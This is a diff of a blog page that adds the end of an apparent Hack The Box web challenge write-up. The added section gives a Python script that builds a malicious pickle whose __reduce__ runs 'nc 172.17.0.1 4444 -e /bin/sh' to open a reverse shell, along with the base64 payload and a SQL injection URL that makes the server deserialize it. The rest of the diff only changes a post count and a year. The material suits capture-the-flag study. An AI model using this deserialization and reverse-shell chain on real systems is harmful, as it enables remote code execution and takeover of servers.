+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'nc 172.17.0.1 4444 -e /bin/sh'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exploit</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> os.system, (payload,)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="built_in">print</span>(base64.urlsafe_b64encode(pickle.dumps(exploit())).decode(<span class="string">'ascii'</span>))</span><br></pre></td></tr></tbody></table></figure>
+
+<p>From here we got the base64 encoded string</p>
+<figure class="highlight abnf"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">gASVOAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjB1uYyAxNzIuMTcuMC4xIDQ0NDQgLWUgL2Jpbi9zaJSFlFKULg</span><span class="operator">=</span><span class="operator">=</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>Now we have to construct the parameter that abuse the SQLI to deserizlise malicious object.<br>`</p>
+<figure class="highlight apache"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://localhost:<span class="number">1337</span>/view/'%<span class="number">20</span>UNION%<span class="number">20</span>SELECT%<span class="number">20</span>'gASVOAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjB1uYyAxNzIuMTcuMC4xIDQ0NDQgLWUgL2Jpbi9zaJSFlFKULg==</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/images/placeholder.png" data-src="/images/HTB-Web-Challenge/image-20240102221626649.png" class="lazyload"></p>
 
 		  	  
 	</div>
@@ -839,7 +792,7 @@
         </a>
     
 
-   <span class="page-number"> Page <strong>4</strong>, Posts <strong>30</strong>. </span>
+   <span class="page-number"> Page <strong>4</strong>, Posts <strong>29</strong>. </span>
 
     
   </nav> 
@@ -936,7 +889,7 @@
 			
 			2020 -
 			
-			2023
+			2024
 			Ikonw
 
 			<br>
